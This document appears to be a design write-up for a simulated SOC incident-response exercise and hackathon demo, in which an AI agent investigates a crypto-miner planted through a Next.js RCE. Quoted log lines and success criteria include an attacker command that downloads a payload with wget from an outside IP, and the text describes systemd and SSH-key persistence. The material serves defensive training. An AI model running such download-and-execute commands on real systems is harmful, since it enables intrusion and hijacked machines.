# SOC Forensic Investigation Simulation

## Overview

This is a realistic cybersecurity incident simulation for SOC analyst training. The scenario involves a compromised production server running a crypto-miner, where the obvious attack vectors (SSH brute force, database exploit) are red herrings, and the actual root cause is a Next.js RCE vulnerability.

## Scenario Background

**Incident:** Production server experiencing 100% CPU usage  
**Date:** January 2026 (Attack occurred December 6, 2025)  
**Attack Vector:** Next.js Server Action RCE (CVE-2024-46982)  
**Payload:** XMRig crypto-miner (linux_aarch64)  
**Persistence:** Systemd service + cron jobs  

## Investigation Workflow

### Phase 1: Triage (Linux Container)
1. Analyst logs into container via `docker exec`
2. Discovers `NCvhHaev` process consuming 100% CPU
3. Checks network connections → sees suspicious connection to `119.28.183.120:19999`
4. Examines `/proc/PID/exe` → shows binary deleted from disk
5. Kills process (but it may restart due to persistence)

### Phase 2: Hypothesis Testing

#### Hypothesis 1: SSH Brute Force Attack ❌
- **Check:** `/var/log/secure`
- **Finding:** Only 20 successful logins from trusted IP `20.40.50.18`
- **Conclusion:** No brute force activity. SSH is secure.

#### Hypothesis 2: Database Exploit 
- **Check:** `netstat -tlnp | grep 5432`
- **Finding:** PostgreSQL listening on `0.0.0.0:5432` only (public)
- **Action Required:** Switch to Windows workstation to verify OCI firewall rules
- **OCI Console Check:** Port 5432 NOT in ingress rules (blocked externally)
- **Conclusion:** Database not exposed. Not the attack vector.

#### Hypothesis 3: Web Application RCE ✅
- **Check:** `/var/log/ideaforge-frontend.log`
- **Finding:** Error logs showing:
  ```
  Error: Command failed: cd /tmp;wget http://103.135.101.15/linux_aarch64
  --2025-12-06 10:37:42-- http://103.135.101.15/linux_aarch64
  2025-12-06 10:37:43 (2.86 MB/s) - 'linux_aarch64' saved [2031616/2031616]
  ```
- **Timestamp Correlation:** Matches file creation times in `/home/opc/ideaforge/frontend/`
- **Conclusion:** Next.js Server Action RCE exploited to download miner

### Phase 3: Persistence Analysis
1. **Systemd Service:** `/etc/systemd/system/apaches-main.service`
2. **Watchdog Script:** `/usr/local/sbin/apaches.sh`
3. **Malware Binaries:** `/usr/local/sbin/nginxs`, `/home/opc/ideaforge/frontend/linux_aarch64`
4. **Backdoor:** SSH key in `/root/.ssh/authorized_keys`

## Multi-Desktop Investigation Flow

```
┌─────────────────────────────────────────────────────────┐
│ Linux Container (Proxi Agent)                           │
│ - Initial triage: top, ps, netstat                      │
│ - Check SSH logs: /var/log/secure                       │
│ - Check database: netstat -tlnp                         │
│ - Need firewall verification → Switch to Windows        │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│ Windows Desktop (OCI Console Access)                    │
│ - Open Oracle Cloud Console                             │
│ - Navigate to VCN Security Lists                        │
│ - Verify: Port 5432 NOT in ingress rules                │
│ - Verify: Port 22 restricted to 20.40.50.18/32          │
│ - Conclusion: External attack via DB/SSH ruled out      │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│ Back to Linux Container                                 │
│ - Deep dive: /var/log/ideaforge-frontend.log            │
│ - Find RCE evidence: wget commands in error logs        │
│ - Correlate timestamps with file creation               │
│ - Map persistence mechanisms                            │
│ - Root cause identified: Next.js RCE                    │
└─────────────────────────────────────────────────────────┘
```

## Forensic Artifacts

### Log Files
- `/var/log/secure` - Clean SSH authentication logs (false lead)
- `/var/log/messages` - System logs with malware service startup
- `/var/log/ideaforge-frontend.log` - **SMOKING GUN** - RCE error logs

### Malware Files
- `/tmp/NCvhHaev` - Running miner process (deleted from disk)
- `/home/opc/ideaforge/frontend/linux_aarch64` - Downloaded miner binary
- `/home/opc/ideaforge/frontend/svchost` - Additional malware
- `/usr/local/sbin/nginxs` - Fake nginx binary

### Persistence
- `/etc/systemd/system/apaches-main.service` - Systemd service
- `/usr/local/sbin/apaches.sh` - Watchdog script
- `/root/.ssh/authorized_keys` - Backdoor SSH key

### Network Indicators
- Connection to `119.28.183.120:19999` (mining pool)
- PostgreSQL on `127.0.0.1:5432` (false lead)

## Expected Investigation Timeline

| Time | Action | Tool/Command |
|------|--------|--------------|
| 0:00 | Identify high CPU process | `top`, `ps aux --sort=-%cpu` |
| 0:30 | Check network connections | `netstat -antp`, `ss -tunap` |
| 1:00 | Investigate SSH logs | `grep "Failed password" /var/log/secure` |
| 1:30 | Check database exposure | `netstat -tlnp \| grep 5432` |
| 2:00 | **Switch to Windows** | Verify OCI firewall rules |
| 3:00 | **Back to Linux** | Check application logs |
| 4:00 | Find RCE evidence | `cat /var/log/ideaforge-frontend.log` |
| 5:00 | Correlate timestamps | `ls -lt /home/opc/ideaforge/frontend` |
| 6:00 | Map persistence | `systemctl list-units \| grep apache` |

## Gemini Agent Prompting Strategy

### Investigation Context
```
You are assisting a SOC analyst investigating a security incident on a production server.

METHODOLOGY:
1. Triage: Identify immediate threats (processes, network)
2. Hypothesis Testing: SSH brute force → DB exploit → Web app RCE
3. Evidence Collection: Preserve logs and file timestamps
4. Root Cause Analysis: Find initial access vector
5. Persistence Mapping: Identify how attacker maintains access

AVAILABLE WORKSTATIONS:
- Linux Container: Compromised server (forensic analysis)
- Windows Desktop: OCI Cloud Console (firewall verification)

When firewall verification is needed, ask analyst to switch workstations.
```

### Sample Investigation Prompts

**Initial Triage:**
```
Analyst: "We have high CPU on production server. Start investigation."
Agent: → top -bn1
       → ps aux --sort=-%cpu | head -10
       → "Found NCvhHaev consuming 99.8% CPU. Investigating..."
```

**SSH Hypothesis:**
```
Analyst: "Check for SSH brute force"
Agent: → grep -i "failed password" /var/log/secure | wc -l
       → last -20
       → "No brute force. Only 20 logins from trusted IP 20.40.50.18"
```

**Database Hypothesis:**
```
Analyst: "Could this be a database exploit?"
Agent: → netstat -tlnp | grep 5432
       → "PostgreSQL on localhost only. Need to verify external firewall."
       → "Please switch to Windows to check OCI Security Lists"
```

**Root Cause Discovery:**
```
Analyst: "Check application logs"
Agent: → cat /var/log/ideaforge-frontend.log
       → grep "Command failed" /var/log/ideaforge-frontend.log
       → "Found RCE evidence: wget http://103.135.101.15/linux_aarch64"
       → ls -lt /home/opc/ideaforge/frontend
       → "Timestamp matches: Dec 6 10:37. Next.js RCE confirmed."
```

## Docker Container Setup

The simulation environment consists of:
1. **Dockerfile** - Oracle Linux 9 with forensic tools
2. **fake_miner.py** - Python script simulating crypto-miner
3. **setup_forensics.sh** - Generates logs and artifacts
4. **OCI_CONSOLE_VIEW.txt** - Mock firewall rules

See `soc-forensics/` directory for complete implementation.

## Running the Simulation

### Build Container
```bash
cd soc-forensics
docker build -t proxi-forensics:v1 .
```

### Start Container
```bash
docker run -d --name forensic-investigation proxi-forensics:v1
```

### Register with Proxi
```bash
# Add to backend/registry/workstations.json
{
  "forensic-linux": {
    "name": "Compromised Server (Forensics)",
    "type": "container",
    "host": "localhost",
    "port": 4003,
    "capabilities": ["terminal", "filesystem", "network"]
  }
}
```

### Analyst Instructions
```
ALERT: Production server experiencing 100% CPU usage.
Application is slow but still running.

YOUR MISSION:
1. Identify the malicious process
2. Determine the attack vector (how did they get in?)
3. List all files created by the attacker
4. Document persistence mechanisms

TOOLS AVAILABLE:
- Linux Container: docker exec -it forensic-investigation /bin/bash
- Windows Desktop: OCI Cloud Console access
- Proxi Agent: Multi-desktop investigation support

HINT: Check ~/OCI_FIREWALL_CONFIG.txt for cloud firewall rules
```

## Success Criteria

Analyst should identify:
- ✅ Malicious process: `NCvhHaev` (crypto-miner)
- ✅ Attack vector: Next.js Server Action RCE
- ✅ Initial payload: `wget http://103.135.101.15/linux_aarch64`
- ✅ Persistence: systemd service `apaches-main.service`
- ✅ Backdoor: SSH key in `/root/.ssh/authorized_keys`
- ✅ False leads eliminated: SSH brute force ❌, DB exploit ❌

## Hackathon Demo Value

**Why This Showcases Proxi:**
1. **Multi-Platform**: Linux container + Windows OCI console
2. **Real Investigation**: Not scripted - agent must reason through hypotheses
3. **Visual Proof**: Screenshots of both environments
4. **Competitive Advantage**: Browser-based AI can't exec into containers
5. **Production Relevance**: Based on real CVE-2024-46982 incident

**Demo Duration:** 2-3 minutes  
**Wow Factor:** High - judges will recognize this as real SOC work

---

## 6. Proxi Agent Integration

### Why Agent Integration is Required

For Gemini to perform the actual investigation, the forensic container must be registered as a Proxi agent. Without this:
- ❌ Gemini cannot execute commands in the container
- ❌ Cannot read log files or analyze artifacts
- ❌ Cannot inspect processes or network connections
- ❌ Investigation remains theoretical only

**With agent integration:**
- ✅ Gemini becomes a fully autonomous SOC analyst
- ✅ Can execute real forensic commands
- ✅ Can analyze logs and identify root cause
- ✅ Can map persistence mechanisms
- ✅ Demonstrates true cross-platform AI capabilities

### Quick Setup

The forensic container now includes a built-in Proxi agent server:

```bash
# 1. Stop old container (if running)
docker stop forensic-investigation
docker rm forensic-investigation

# 2. Build agent-enabled image
cd soc-forensics
docker build -t proxi-forensics:v2 .

# 3. Start with agent support
docker compose -f docker-compose.forensic.yml up -d

# 4. Verify agent is working
curl http://localhost:5081/health
curl http://localhost:5081/capabilities
```

### Agent Capabilities

The forensic agent provides these tools for Gemini:
1. **run_terminal_command** - Execute shell commands
2. **read_file** - Read logs, configs, artifacts
3. **search_logs** - Grep through log files
4. **list_processes** - Show running processes
5. **network_connections** - Display active connections

### Manual Registration (Optional)

If you want to register the agent with Proxi Core UI:
1. Open Proxi UI at `http://localhost:4002`
2. Go to **Workstations** tab
3. Click **Add Workstation**
4. Fill in:
   - Name: `forensic-investigation`
   - URL: `http://forensic-investigation:8081`
   - Platform: `Linux`

### Investigation Workflow with Agent

```
User: "Investigate high CPU on forensic-investigation"
  ↓
Gemini switches to forensic-investigation workstation
  ↓
Gemini: list_processes() → Identifies fake_miner at 58% CPU
  ↓
Gemini: search_logs("error") → Finds RCE in app logs
  ↓
Gemini: read_file("/tmp/NCvhHaev") → Analyzes malware
  ↓
Gemini: run_terminal_command("systemctl list-units") → Finds persistence
  ↓
Gemini: Reports findings with evidence and remediation steps
```

**See `soc-forensics/AGENT_SETUP.md` for detailed setup instructions.**

---

## 7. Hackathon Demo Value

### Why This Showcases Proxi's Unique Capabilities





-------------------
{
"win-desktop": {
    "id": "win-desktop",
    "name": "Windows Desktop (Home)",
    "description": "Test win",
    "host": "100.107.2.119",
    "port": 8081,
    "workstation_type": "windows",
    "capabilities": ["terminal", "screenshot", "desktop", "file_operations"],
    "is_default": false
  },
  "linux-docker": {
    "id": "linux-docker",
    "name": "Linux Agent (Docker)",
    "description": "Docker container - terminal only",
    "workstation_type": "linux",
    "host": "agent",
    "port": 8081,
    "capabilities": [
      "terminal",
      "system_health"
    ],
    "status": "online",
    "last_seen": "2026-01-28T14:38:23.632268",
    "created_at": "2026-01-27T20:46:01.703721",
    "owner": "",
    "tags": [],
    "is_default": true
  },
  "forensics-linux": {
    "name": "Compromised Server (Forensics)",
    "host": "localhost",
    "port": 4003,
    "capabilities": ["terminal", "filesystem", "network"]
  }
}
   